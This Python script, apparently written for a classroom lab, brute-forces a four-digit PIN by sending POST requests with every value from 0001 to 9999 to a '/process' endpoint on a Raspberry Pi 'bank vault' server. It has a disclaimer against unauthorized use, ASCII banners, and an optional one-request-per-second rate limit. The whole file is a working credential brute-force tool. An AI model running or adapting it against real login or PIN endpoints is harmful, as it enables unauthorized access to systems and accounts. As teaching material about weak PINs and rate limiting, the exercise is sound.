#!/usr/bin/env python3

# Disclaimer: This script is for educational purposes only.  
# Do not use against any server that you don't own or have authorization to test. 
# To run this script use:
# sudo python3 brute_force.py <Rasperry Pi Server IP> <Port> (ex. python3 brute_force.py 10.80.211.100 5000)

import requests
import sys
import time

rate_limit: float = 0.1 

def print_header():
    """ This function prints header. """
    # Program Header
    print(r""" 
    ███    ███ ██    ██ ███    ██ ██ ███    ██ ███    ██ 
    ████  ████ ██    ██ ████   ██ ██ ████   ██ ████   ██ 
    ██ ████ ██ ██    ██ ██ ██  ██ ██ ██ ██  ██ ██ ██  ██ 
    ██  ██  ██ ██    ██ ██  ██ ██    ██  ██ ██ ██  ██ ██ 
    ██      ██  ██████  ██   ████ ██ ██   ████ ██   ████                          
                                                     """)
    print("\n****************************************************************")
    print("\n* Copyright of Aleks Holland Johansen, 2023                    *")
    print("\n* https://github.com/AleksHolland84                            *")
    print("\n****************************************************************")
    print("_________________________________________________________")

def script_kitty():
    """ This function prints the script kitty header. """
    # Program Header
    print(r"""

    ███████  ██████ ██████  ██ ██████  ████████     ██   ██ ██ ████████ ████████ ██    ██ 
    ██      ██      ██   ██ ██ ██   ██    ██        ██  ██  ██    ██       ██     ██  ██  
    ███████ ██      ██████  ██ ██████     ██        █████   ██    ██       ██      ████   
         ██ ██      ██   ██ ██ ██         ██        ██  ██  ██    ██       ██       ██    
    ███████  ██████ ██   ██ ██ ██         ██        ██   ██ ██    ██       ██       ██    
                                                     
                                                     """)
    print("\n****************************************************************")
    print("\n* Only Script Kiddies copy-paste other's scripts               *")
    print("\n* Please try to understand the script before use               *")
    print("\n* The script is rate limited to one request per second         *")
    print("\n****************************************************************")
    print("_________________________________________________________")

if __name__ == "__main__":
    print_header()
    print(f"Brute-forcing: {sys.argv[1]} on port: {sys.argv[2]}")
    time.sleep(2)
    the_kitty = input("Did you download the script? (n/y): ")
    if the_kitty != "n":
        rate_limit: float = 1.0 # Rate limit the requests
        script_kitty() # Waits for user input to show script kitty header
    try:
        url = sys.argv[1] # Get 1st user argument
        port = sys.argv[2] # Get 2nd user argument
        protocol = "http://" # Default protocol for requesting websites
    except IndexError:
        raise SystemExit(f"Usage: {sys.argv[0]} <bank_vault_IP> <PORT>")

    try:
        for i in range(1,10000): # 0000 locks the vault
            pin = str(i).zfill(4) # format i to include leading zeros 
            print(f"Trying with pin: {pin}")
    
            payload = {"pincode": pin} # Data for the POST request
            response = requests.post(f"{protocol}{url}:{port}/process", data = payload) # Send the POST request
    
            if "DENIED"  in response.text:
                print(f"PIN {pin} DENIED")
            else:
                print(f"""################### ACCESS WITH PIN: {pin} ####################""")
                break
            time.sleep(rate_limit) # Rate limit the request
    except KeyboardInterrupt:
        print("You typed CTRL + C, which is the keyboard interrupt exception")
        sys.exit()
